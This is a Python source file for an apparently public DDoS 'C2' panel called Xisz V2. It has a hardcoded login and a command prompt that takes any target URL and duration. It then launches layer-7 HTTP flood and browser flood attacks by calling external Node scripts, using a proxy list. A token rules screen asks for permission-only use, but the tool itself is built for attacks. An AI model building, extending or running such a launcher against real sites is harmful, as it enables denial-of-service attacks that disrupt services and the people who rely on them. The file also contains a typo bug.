import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
 ██▒   █▓ ██▓ ██▓███      ██▓███   ▄▄▄       ███▄    █ ▓█████  ██▓    
▓██░   █▒▓██▒▓██░  ██▒   ▓██░  ██▒▒████▄     ██ ▀█   █ ▓█   ▀ ▓██▒    
 ▓██  █▒░▒██▒▓██░ ██▓▒   ▓██░ ██▓▒▒██  ▀█▄  ▓██  ▀█ ██▒▒███   ▒██░    
  ▒██ █░░░██░▒██▄█▓▒ ▒   ▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██░    
   ▒▀█░  ░██░▒██▒ ░  ░   ▒██▒ ░  ░ ▓█   ▓██▒▒██░   ▓██░░▒████▒░██████▒
   ░ ▐░  ░▓  ▒▓▒░ ░  ░   ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░▓  ░
   ░ ░░   ▒ ░░▒ ░        ░▒ ░       ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ░  ░░ ░ ▒  ░
     ░░   ▒ ░░░          ░░         ░   ▒      ░   ░ ░    ░     ░ ░   
      ░   ░                             ░  ░         ░    ░  ░    ░  ░
     ░                                                                
    ''')
    

def si():
    print('         \x1b[38;5;160m[ \x1b[38;2;233;233;233mXisz V2 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to Xisz Panel! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: An0n K4ndar \x1b[38;5;160m| \x1b[38;2;233;233;233mUpdate v2')
    print("")

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;5;160m╔═══════════════╗
                                \x1b[38;5;160m║     \x1b[38;5;160mRules     \x1b[38;5;160m║
                \x1b[38;5;160m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;5;160m║ \x1b[38;5;160m1. Do not attack without someone's permission \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m3. Do not spam attacks                        \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m4. Only attack stress testing servers         \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m5. Don't skid the panel                       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m6. Give a star to the github repository       \x1b[38;5;160m║
                \x1b[38;5;160m║ \x1b[38;5;160m7. The creator does not do any harm           \x1b[38;5;160m║
                \x1b[38;5;160m╚═══════════════════════════════════════════════╝
''')

def layer7():
    clear()
    si()
    print(f'''
                               \x1b[38;5;160m╔═══════════════╗
                               \x1b[38;5;160m║    \x1b[38;5;160mLayer 7    \x1b[38;5;160m║
               \x1b[38;5;160m╔═══════════════╩═══════════════╩═════════════╗
               \x1b[38;5;160m║   \x1b[38;5;160mHTTP-FLOOD              \x1b[38;5;160m║   \x1b[38;5;160mBROWSER       \x1b[38;5;160m║
               \x1b[38;5;160m╚═════════════════════════════════════════════╝
               
               \x1b[255;255;0m ===> UPDATE METHODS ? :)     
               ''')

def menu():
    sys.stdout.write(f"         \x1b]2;Xisz V2 | Online 3 | CONNS 100 | USERS xiszadmin\x07")
    clear()
    print('\x1b[38;5;160m[ \x1b[38;2;233;233;233mXisz V2 \x1b[38;5;160m] | \x1b[38;2;233;233;233mWelcome to , Xisz V2! \x1b[38;5;160m| \x1b[38;2;233;233;233mOwner: An0n K4ndar \x1b[38;5;160m| \x1b[38;2;233;233;233mUpdate v2')
    print("")
    print("""
\x1b[38;5;160m - Hello , Admin K4ndar ?
\x1b[38;5;160m - WellCome To C2 DDoS Xisz_V2
\x1b[38;5;160m - V2 Update Methods !

""")


def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;5;160m╔══[Xisz\x1b[\x1b[38;5;160m@a\x1b[38;5;160md\x1b[38;5;160mmin\x1b[38;2;0;49;147m]
\x1b[38;5;160m╚\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m═\x1b[38;5;160m➤ \x1b[38;5;160m''')
        if cnc == "methods" or cnc == "METHODS" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        
        elif "BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.sqlit()[3]
                os.system(f'node BROWSER.js {url} {time} {req_per_ip} http.txt')
            except IndexError:
                print('Usage: BROWSER <url> <time> <req_per_ip>')
                print('Example: BROWSER <http://example.com> <60> <100>')

        elif "HTTP-FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-FLOOD.js {url} {time} ')
            except IndexError:
                print('Usage: HTTP-FLOOD <url> <time>')
                print('Example: HTTP-FLOOD http://XNXX.COM 60')

        elif "help" in cnc:
            print(f'''
METHODS  ► SHOW LAYER7 METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
def login():
    clear()
    user = "Xisz"
    passwd = "147"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! SHIT ?...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to XiszBot !")
        time.sleep(0.3)
        ascii_vro()
        main()

login()


